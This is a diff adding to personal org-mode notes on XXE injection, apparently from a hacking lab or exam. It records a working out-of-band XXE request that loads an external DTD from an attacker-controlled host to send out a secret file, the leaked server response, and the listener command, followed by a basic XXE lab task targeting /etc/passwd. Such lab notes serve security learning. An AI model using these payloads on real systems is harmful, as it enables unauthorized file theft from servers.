@@ -336,3 +336,69 @@ These resources contain a wide range of XXE payloads for different scenarios and
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
 
 https://github.com/payloadbox/xxe-injection-payload-list
+
+* exam OOB XXE
+
+*request* ->
+#+begin_src javascript
+POST /contact.php HTTP/1.1
+Host: lunaristech.hv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-type: application/xml
+Content-Length: 112
+Origin: http://lunaristech.hv
+Connection: keep-alive
+Referer: http://lunaristech.hv/
+Priority: u=0
+
+<?xml version="1.0" ?> <!DOCTYPE root [ <!ENTITY % dtd SYSTEM "http://172.20.4.54:7777/xxe.dtd"> %dtd; %send; ]>
+
+#+end_src
+
+*response* ->
+#+begin_src python
+HTTP/1.1 200 OK
+Date: Wed, 01 Oct 2025 01:27:22 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 563
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<br />
+<b>Warning</b>:  DOMDocument::loadXML(): Invalid URI: http://172.20.4.54/?data=Arcturus in Entity, line: 2 in <b>/var/www/html/contact.php</b> on line <b>12</b><br />
+<br />
+<b>Warning</b>:  DOMDocument::loadXML(): Start tag expected, '&lt;' not found in Entity, line: 1 in <b>/var/www/html/contact.php</b> on line <b>12</b><br />
+<br />
+<b>Fatal error</b>:  Uncaught Error: Call to a member function getElementsByTagName() on null in /var/www/html/contact.php:16
+Stack trace:
+#0 {main}
+  thrown in <b>/var/www/html/contact.php</b> on line <b>16</b><br />
+#+end_src
+
+WIth the content of the secret.txt at ?data= parameter ~Arcturus~
+
+*used payload* ->
+: <?xml version="1.0" ?> <!DOCTYPE root [ <!ENTITY % dtd SYSTEM "http://172.20.4.54:7777/xxe.dtd"> %dtd; %send; ]>
+
+*python3 http server listening* ->
+#+begin_src sh
+python3 -m http.server 7777
+#+end_src
+
+* basic XXE
+This lab contains a XML External Entity Injection (XXE) vulnerability that leads to unauthorized access to local files within the system.
+
+To complete the lab, exploit the XXE vulnerability in the contact form on the web page and access the contents of the /etc/password file.
+
+What is the username of the last user added in /etc/passwd?
+
+*payload to test* ->
+#+begin_src xml
+<?xml version="1.0"?> <!DOCTYPE test [ <!ENTITY name "Cyber"> ]> <contact>     <firstName>Usuário</firstName>     <lastName>Teste</lastName>     <email>email@teste.com</email>     <message>Olá, &name;!</message> </contact>
+#+end_src
